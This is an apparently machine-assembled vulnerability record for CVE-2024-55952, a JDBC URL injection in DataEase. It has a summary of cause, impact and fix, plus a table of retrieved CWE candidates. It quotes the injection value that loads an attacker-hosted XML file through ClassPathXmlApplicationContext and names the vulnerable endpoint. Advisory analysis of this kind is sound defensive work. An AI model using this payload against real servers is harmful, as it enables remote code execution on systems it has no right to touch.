# Vulnerability Information: CVE-2024-55952

## Vulnerability Description
DataEase is an open source business analytics tool. Authenticated users can remotely execute code through the backend JDBC connection. When constructing the jdbc connection string, the parameters are not filtered. Constructing the host as ip5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http//ip5432/1.xml&a= can trigger the ClassPathXmlApplicationContext construction method. The vulnerability has been fixed in v1.18.27. Users are advised to upgrade. There are no known workarounds for this vulnerability.

### Vulnerability Description Key Phrases
- **impact:** remote code execution and remotely execute code
- **vector:** constructing the host as ip5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http//ip5432/1.xml&a=
- **attacker:** authenticated users
- **product:** DataEase
- **version:** before v1.18.27
- **component:** backend JDBC connection

## CVE Reference Links Content Summary
Based on the provided content, here's an analysis of CVE-2024-55952:

**Root Cause of Vulnerability:**
The vulnerability stems from the insecure construction of JDBC connection strings within the Dataease application, specifically in the `RedshiftConfiguration` class. The application does not properly sanitize or filter user-supplied parameters when creating the JDBC URL. This allows an attacker to inject malicious parameters into the connection string, leading to Remote Code Execution (RCE).

**Weaknesses/Vulnerabilities Present:**
- **Insufficient Input Validation:** The application fails to validate or sanitize user-provided parameters, specifically the `host` parameter in the JDBC connection string.
- **JDBC URL Injection:** Attackers can inject malicious parameters like `socketFactory` and `socketFactoryArg` into the JDBC URL.
- **Insecure Deserialization:** By injecting `socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext` and `socketFactoryArg` pointing to a malicious XML configuration file, attackers can trigger the construction method of `ClassPathXmlApplicationContext`, which can be used to execute arbitrary code.

**Impact of Exploitation:**
- **Remote Code Execution (RCE):** A successful exploit allows an attacker to execute arbitrary code on the server hosting the Dataease application. This could lead to complete system compromise, data theft, or denial of service.

**Attack Vectors:**
- **Network:** The attack is launched through HTTP requests. The attacker sends a crafted POST request to the `/datasource/validate/` endpoint, containing malicious parameters in the JSON payload.
- **Authentication:** The attacker needs to be an authenticated user of the Dataease application to exploit this vulnerability.

**Required Attacker Capabilities/Position:**
- **Authenticated User:** The attacker must have a valid user account on the Dataease system.
- **Network Access:** The attacker must be able to send HTTP requests to the vulnerable Dataease server.
- **Malicious Server:** The attacker needs to control a server to host a malicious XML configuration file, referenced by the `socketFactoryArg` parameter.

**Additional Details:**
- The provided code examples show the vulnerable code and the malicious XML file used for RCE.
- The vulnerability is located in the `io.dataease.dto.datasource.RedshiftConfiguration` class.
- The commit `0db4872a52eccf6e83dd9359aa05db52dd580ec1` fixes the vulnerability by adding a list of illegal parameters and checking the JDBC URL string for them.

**Mitigation:**
- **Upgrade:** The vulnerability is fixed in version 1.18.27. It's highly recommended to upgrade to this version or later.
- **Input Validation:** Implement proper input validation and sanitization to prevent injection of malicious parameters into JDBC connection strings.
- **Parameter Blacklisting:** The fix implements a blacklisting approach to prevent usage of specific parameters in the connection string.

This vulnerability allows authenticated users to execute arbitrary code on the server hosting Dataease. The fix involves sanitizing the JDBC connection string by blacklisting known dangerous parameters.

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 1333 | Inefficient Regular Expression Complexity | Base | Allowed | sparse | 0.122 |
| 2 | 532 | Insertion of Sensitive Information into Log File | Base | Allowed | sparse | 0.121 |
| 3 | 1336 | Improper Neutralization of Special Elements Used in a Template Engine | Base | Allowed | sparse | 0.120 |
| 4 | 88 | Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') | Base | Allowed | sparse | 0.120 |
| 5 | 138 | Improper Neutralization of Special Elements | Class | Discouraged | sparse | 0.120 |
| 6 | 201 | Insertion of Sensitive Information Into Sent Data | Base | Allowed | sparse | 0.119 |
| 7 | 674 | Uncontrolled Recursion | Class | Allowed-with-Review | sparse | 0.115 |
| 8 | 770 | Allocation of Resources Without Limits or Throttling | Base | Allowed | sparse | 0.115 |
| 9 | 917 | Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection') | Base | Allowed | dense | 0.469 |
| 10 | 78 | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | Base | Allowed | graph | 0.002 |

